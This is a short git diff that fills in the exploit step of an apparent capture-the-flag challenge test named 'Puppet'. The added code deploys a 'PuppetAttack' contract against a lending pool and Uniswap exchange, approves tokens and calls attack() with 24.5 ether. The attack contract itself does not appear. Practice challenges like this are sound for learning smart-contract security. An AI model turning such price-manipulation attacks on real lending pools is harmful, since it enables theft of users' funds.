@@ -103,6 +103,19 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        this.hack = await (await ethers.getContractFactory('PuppetAttack', attacker)).deploy(
+            this.lendingPool.address,
+            this.uniswapExchange.address,
+            this.token.address,
+            attacker.address
+        );
+       
+        //approve attack contract
+        await this.token.connect(attacker).approve(this.hack.address, POOL_INITIAL_TOKEN_BALANCE);
+
+        //attack
+        this.hack.attack( {value: ethers.utils.parseEther('24.5')} );  
+
     });
 
     after(async function () {
